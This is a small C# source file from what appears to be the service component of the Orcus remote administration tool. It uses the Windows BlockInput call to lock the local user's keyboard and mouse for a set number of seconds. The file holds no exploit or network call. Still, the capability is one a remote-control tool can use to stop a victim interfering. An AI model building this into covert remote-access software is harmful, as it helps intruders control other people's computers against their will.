using System;
using System.Threading;
using Orcus.Service.Native;

namespace Orcus.Service.Core
{
    internal class BlockUserInput
    {
        public static void Block(int seconds)
        {
            NativeMethods.BlockInput(true);
            try
            {
                Thread.Sleep(TimeSpan.FromSeconds(seconds));
            }
            catch
            {
                // ignored
            }
            finally
            {
                NativeMethods.BlockInput(false);
            }
        }
    }
}